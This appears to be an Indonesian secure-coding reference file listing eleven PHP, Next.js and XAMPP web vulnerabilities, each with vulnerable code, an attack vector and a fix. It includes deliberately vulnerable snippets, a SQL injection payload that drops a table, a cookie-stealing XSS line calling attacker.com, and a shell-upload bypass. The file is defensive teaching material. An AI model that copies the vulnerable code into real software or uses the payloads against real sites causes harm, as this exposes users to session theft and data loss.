# Known Vulnerabilities Database — Vibes Coding Workflow v3.1.0

*Diisi otomatis setelah compliance check / fix (`cek komponen`) → user approve.*
*AI WAJIB baca file ini SILENT saat coding mode untuk mencegah pengulangan.*
*Pre-populated v3.1.0: 10 entry umum untuk stack PHP Native + Next.js + XAMPP*

---

## Daftar Vulnerability

---

[VULN-001] SQL Injection via String Concatenation
Severity   : CRITICAL
OWASP      : A03 Injection
Stack      : PHP Native
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Query database dengan input dari GET/POST tanpa prepared statement

Kode Rentan (SEBELUM fix):
  ```php
  $id = $_GET['id'];
  $query = "SELECT * FROM users WHERE id = " . $id;
  $result = mysqli_query($conn, $query);
  ```

Vektor Serangan:
  Input: ?id=1 OR 1=1 -- → dump seluruh tabel
  Input: ?id=1; DROP TABLE users -- → hapus tabel

Kode Aman (SETELAH fix):
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->execute([$_GET['id']]);
  $result = $stmt->fetchAll();
  ```

Pelajaran:
  WAJIB gunakan PDO prepared statement untuk SEMUA query yang menerima input user.
  FORBIDDEN string concatenation di SQL query apapun.

---

[VULN-002] XSS via echo Tanpa Sanitasi
Severity   : HIGH
OWASP      : A03 Injection (XSS)
Stack      : PHP Native
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Output data user ke HTML tanpa escaping

Kode Rentan (SEBELUM fix):
  ```php
  echo $_POST['name'];
  echo "<p>Selamat datang, " . $_GET['username'] . "</p>";
  ```

Vektor Serangan:
  Input: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>
  → Cookie session user terkirim ke attacker

Kode Aman (SETELAH fix):
  ```php
  echo htmlspecialchars($_POST['name'], ENT_QUOTES, 'UTF-8');
  echo "<p>Selamat datang, " . htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8') . "</p>";
  ```

Pelajaran:
  WAJIB wrap SEMUA output variabel dengan htmlspecialchars(). Buat helper: h($str).
  FORBIDDEN echo $variable langsung tanpa escaping ke HTML.

---

[VULN-003] Next.js API Route Tanpa Auth Check
Severity   : HIGH
OWASP      : A01 Broken Access Control
Stack      : Next.js App Router
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : API endpoint mengembalikan data sensitif tanpa memverifikasi session

Kode Rentan (SEBELUM fix):
  ```typescript
  // app/api/users/route.ts
  export async function GET(req: Request) {
    const users = await prisma.user.findMany();
    return Response.json(users);
  }
  ```

Vektor Serangan:
  GET /api/users → siapapun bisa akses daftar user + data sensitif tanpa login

Kode Aman (SETELAH fix):
  ```typescript
  import { getServerSession } from 'next-auth';
  import { authOptions } from '@/lib/auth';

  export async function GET(req: Request) {
    const session = await getServerSession(authOptions);
    if (!session) return new Response('Unauthorized', { status: 401 });
    const users = await prisma.user.findMany();
    return Response.json(users);
  }
  ```

Pelajaran:
  WAJIB cek session di SETIAP API route yang mengembalikan data user.
  FORBIDDEN mengandalkan middleware saja tanpa double-check di route.

---

[VULN-004] PHP Session Fixation
Severity   : HIGH
OWASP      : A07 Identification and Authentication Failures
Stack      : PHP Native
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Login handler tidak regenerate session ID setelah autentikasi berhasil

Kode Rentan (SEBELUM fix):
  ```php
  session_start();
  if ($passwordValid) {
      $_SESSION['user_id'] = $userId;
      $_SESSION['logged_in'] = true;
  }
  ```

Vektor Serangan:
  Attacker set session ID ke nilai known → korban login → attacker pakai session ID yang sama

Kode Aman (SETELAH fix):
  ```php
  session_start();
  if ($passwordValid) {
      session_regenerate_id(true); // WAJIB: hapus session lama, buat baru
      $_SESSION['user_id'] = $userId;
      $_SESSION['logged_in'] = true;
  }
  ```

Pelajaran:
  WAJIB panggil session_regenerate_id(true) SEGERA setelah login berhasil.
  Parameter true = hapus session file lama di server.

---

[VULN-005] File Upload MIME Type Bypass
Severity   : HIGH
OWASP      : A04 Insecure Design
Stack      : PHP Native
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Upload handler hanya cek ekstensi file, bukan MIME type sebenarnya

Kode Rentan (SEBELUM fix):
  ```php
  $ext = pathinfo($_FILES['photo']['name'], PATHINFO_EXTENSION);
  if (in_array($ext, ['jpg', 'png', 'gif'])) {
      move_uploaded_file($_FILES['photo']['tmp_name'], 'uploads/' . $_FILES['photo']['name']);
  }
  ```

Vektor Serangan:
  Upload shell.php → rename jadi shell.php.jpg → server execute PHP via akses langsung

Kode Aman (SETELAH fix):
  ```php
  $finfo = new finfo(FILEINFO_MIME_TYPE);
  $mime = $finfo->file($_FILES['photo']['tmp_name']);
  $allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

  if (!in_array($mime, $allowedMimes)) die('File type not allowed');

  $filename = bin2hex(random_bytes(16)) . '.' . $ext; // UUID filename
  $uploadPath = dirname($_SERVER['DOCUMENT_ROOT']) . '/uploads/'; // di luar webroot
  move_uploaded_file($_FILES['photo']['tmp_name'], $uploadPath . $filename);
  ```

Pelajaran:
  WAJIB cek MIME type sebenarnya dengan finfo, bukan hanya ekstensi nama file.
  WAJIB simpan upload di luar webroot agar tidak bisa diakses langsung via browser.
  WAJIB UUID filename — FORBIDDEN gunakan nama file asli dari user.

---

[VULN-006] CSRF pada Form PHP Native
Severity   : MEDIUM
OWASP      : A01 Broken Access Control
Stack      : PHP Native
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Form POST tanpa CSRF token — aksi sensitif bisa ditrigger dari halaman lain

Kode Rentan (SEBELUM fix):
  ```php
  // form.php
  <form method="POST" action="delete.php">
    <input name="id" value="123">
    <button>Hapus</button>
  </form>
  // delete.php
  $id = $_POST['id'];
  $stmt = $pdo->prepare("DELETE FROM users WHERE id = ?");
  $stmt->execute([$id]);
  ```

Kode Aman (SETELAH fix):
  ```php
  // Generate token (di form)
  session_start();
  $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
  // <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

  // Verifikasi token (di action handler)
  session_start();
  if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
      http_response_code(403);
      die('CSRF token invalid');
  }
  ```

Pelajaran:
  WAJIB CSRF token di SEMUA form yang melakukan aksi write (POST, DELETE, UPDATE).
  WAJIB gunakan hash_equals() bukan == untuk perbandingan token (timing attack safe).

---

[VULN-007] Password Hashing Tidak Aman
Severity   : CRITICAL
OWASP      : A02 Cryptographic Failures
Stack      : PHP Native
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Menyimpan password sebagai MD5 atau SHA1 atau plaintext

Kode Rentan (SEBELUM fix):
  ```php
  $hash = md5($password);           // BROKEN
  $hash = sha1($password);          // BROKEN
  $hash = $password;                // CATASTROPHIC
  ```

Kode Aman (SETELAH fix):
  ```php
  $hash = password_hash($password, PASSWORD_ARGON2ID); // RECOMMENDED
  // Verifikasi:
  if (password_verify($inputPassword, $storedHash)) { /* login ok */ }
  ```

Pelajaran:
  WAJIB gunakan password_hash() dengan PASSWORD_ARGON2ID (atau PASSWORD_BCRYPT minimum).
  FORBIDDEN MD5, SHA1, SHA256 untuk hashing password.

---

[VULN-008] Direktori Listing Terbuka di XAMPP
Severity   : MEDIUM
OWASP      : A05 Security Misconfiguration
Stack      : PHP Native + XAMPP Apache
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Apache XAMPP default mengaktifkan directory listing — semua file terlihat

Kode Rentan:
  Apache default: Options +Indexes → http://localhost/project/ menampilkan semua file

Kode Aman (SETELAH fix):
  ```apache
  # Di .htaccess root proyek
  Options -Indexes
  ServerSignature Off
  ```
  Atau di httpd.conf XAMPP:
  ```apache
  <Directory "C:/xampp/htdocs">
      Options -Indexes
  </Directory>
  ```

Pelajaran:
  WAJIB tambahkan Options -Indexes di .htaccess setiap proyek baru di XAMPP.
  WAJIB pastikan .htaccess tidak di-ignore Apache (AllowOverride All).

---

[VULN-009] .env Terekspos di Webroot XAMPP
Severity   : CRITICAL
OWASP      : A02 Cryptographic Failures
Stack      : PHP Native + XAMPP
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : File .env disimpan di dalam folder htdocs dan bisa diakses via browser

Kode Rentan:
  Struktur: C:\xampp\htdocs\myapp\.env → http://localhost/myapp/.env → DB_PASSWORD terekspos

Kode Aman (SETELAH fix):
  ```apache
  # .htaccess — blokir akses ke file sensitif
  <FilesMatch "^\.env|composer\.json|package\.json|\.git">
      Order allow,deny
      Deny from all
  </FilesMatch>
  ```
  Atau pindahkan .env ke luar webroot:
  C:\xampp\env\myapp\.env (di luar htdocs)

Pelajaran:
  WAJIB blokir .env via .htaccess ATAU simpan di luar htdocs.
  WAJIB cek bahwa .gitignore sudah include .env sebelum push.

---

[VULN-010] Next.js Environment Variable Bocor ke Client
Severity   : HIGH
OWASP      : A02 Cryptographic Failures
Stack      : Next.js
Tanggal    : 2026-07-13

Lokasi:
  Konteks  : Secret server-side diprefix NEXT_PUBLIC_ sehingga masuk ke JS bundle client

Kode Rentan:
  ```env
  NEXT_PUBLIC_DATABASE_URL=postgresql://... # EXPOSED ke browser!
  NEXT_PUBLIC_OPENAI_API_KEY=sk-...        # EXPOSED ke browser!
  ```

Kode Aman (SETELAH fix):
  ```env
  # Server-only (tidak ada NEXT_PUBLIC_ prefix)
  DATABASE_URL=postgresql://...
  OPENAI_API_KEY=sk-...

  # Client-safe (tidak sensitif)
  NEXT_PUBLIC_APP_URL=https://myapp.com
  NEXT_PUBLIC_ANALYTICS_ID=G-XXXXXXXX
  ```

Pelajaran:
  WAJIB NEXT_PUBLIC_ HANYA untuk nilai yang boleh dilihat siapapun.
  FORBIDDEN prefix NEXT_PUBLIC_ pada API key, DB URL, secret apapun.

---

[VULN-011] Security Header Duplication, Conflicting Policy & Missing Origin Isolation
Severity   : MEDIUM
OWASP      : A02 Security Misconfiguration
Stack      : Universal (PHP Native, Laravel, Next.js, Apache, Nginx)
Tanggal    : 2026-08-28

Lokasi:
  Konteks  : Konfigurasi HTTP Response Headers di-set di multiple layer (proxy/web server/app) tanpa deduplikasi, menyebabkan header ganda, nilai Referrer-Policy bertabrakan, localhost leak di CSP production, dan absennya COOP/CORP isolation.

Kode Rentan (SEBELUM fix):
  ```apache
  # Menggunakan Header add tanpa unset, memasang nilai Referrer-Policy ganda
  Header add Referrer-Policy "strict-origin-when-cross-origin"
  Header add Referrer-Policy "same-origin"
  # CSP memuat localhost di environment production
  Header add Content-Security-Policy "connect-src 'self' http://localhost:* ws://localhost:* https://*.example.com;"
  # Legacy XSS Protection masih aktif
  Header add X-XSS-Protection "1; mode=block"
  # Tidak ada COOP & CORP
  ```

Vektor Serangan:
  1. Parser confusion pada browser akibat nilai Referrer-Policy bertabrakan (`strict-origin-when-cross-origin` vs `same-origin`) menyebabkan kebocoran URL path sensitif ke pihak ketiga.
  2. CSP connect-src yang mengizinkan `localhost:*` di production memungkinkan script jahat berinteraksi dengan internal developer services/ports milik pengguna.
  3. Absennya COOP & CORP membuka celah XS-Leaks dan Spectre side-channel attacks.

Kode Aman (SETELAH fix):
  ```apache
  <IfModule mod_headers.c>
      # 1. Unset semua header lama untuk cegah duplikasi
      Header always unset Referrer-Policy
      Header always unset Content-Security-Policy
      Header always unset X-XSS-Protection
      Header always unset Cross-Origin-Opener-Policy
      Header always unset Cross-Origin-Resource-Policy

      # 2. Set header tunggal & hardened
      Header always set Referrer-Policy "strict-origin-when-cross-origin"
      Header always set X-XSS-Protection "0"
      Header always set Cross-Origin-Opener-Policy "same-origin"
      Header always set Cross-Origin-Resource-Policy "same-origin"
      Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://*.example.com; upgrade-insecure-requests;"
  </IfModule>
  ```

Pelajaran:
  WAJIB konfigurasikan security headers di 1 layer saja atau gunakan Header always unset sebelum Header always set.
  WAJIB pisahkan CSP development vs production (jangan bawa localhost ke production).
  WAJIB sertakan COOP (`same-origin`) dan CORP (`same-origin`) untuk isolasi proses browser.

